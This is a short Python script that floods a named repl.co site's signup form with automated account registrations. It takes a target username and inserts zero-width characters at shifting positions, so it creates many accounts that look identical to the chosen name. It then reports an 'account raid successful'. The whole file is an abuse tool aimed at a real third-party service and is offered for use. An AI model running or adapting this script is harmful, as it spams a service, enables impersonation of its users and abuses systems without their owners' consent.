import requests

url = 'https://yaksiege-1.johnnyl19432.repl.co/signup'


def create(username):
    form_data = {
        'username': username,
        'password': 'spoon',
        'repeat-password': 'spoon'
    }
    r = requests.post(url, data=form_data)
    print(r.content)


def main():
    zero_width = '​'
    username_original = input('Enter username >>> ')
    maxlength = 20
    username_iteration = 0
    space_iteration = 1
    while True:
        username = f'{username_original[:username_iteration]}{zero_width * space_iteration}{username_original[username_iteration:]}'
        space_iteration += 1
        if len(username) > maxlength:
            username_iteration += 1
            space_iteration = 1
            username = username_original
            continue
        if username_iteration == len(username):
            print('account raid successful')
            break
        create(username)


if __name__ == '__main__':
    main()
